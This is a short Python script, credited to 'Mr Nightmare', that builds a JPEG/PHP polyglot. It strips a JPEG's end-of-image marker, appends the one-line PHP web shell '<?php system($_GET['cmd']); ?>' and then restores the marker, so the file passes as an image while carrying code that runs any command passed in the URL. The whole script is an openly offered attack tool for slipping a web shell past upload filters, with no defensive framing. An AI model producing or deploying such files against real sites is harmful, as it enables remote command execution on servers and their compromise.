#!/usr/bin/env python3
import sys

if len(sys.argv) != 3:
    print(f"Usage: {sys.argv[0]} <image.jpg> <output.jpg>")
    sys.exit(1)

input_file = sys.argv[1]
output_file = sys.argv[2]

# Simple PHP code
php_code = "<?php system($_GET['cmd']); ?>"

with open(input_file, "rb") as f:
    data = f.read()

# Verify the image ends with FF D9
if not data.endswith(b"\xFF\xD9"):
    print("[-] Not a valid JPEG (missing FF D9 marker).")
    sys.exit(1)

# Remove the last 2 bytes (FF D9)
data = data[:-2]

# Add PHP code as plain text
data += php_code.encode()

# Restore the FF D9 marker
data += b"\xFF\xD9"

# Write the output to the new file
with open(output_file, "wb") as f:
    f.write(data)

print(f"[+] Polyglot image saved as {output_file}")

# Copyright: Mr Nightmare
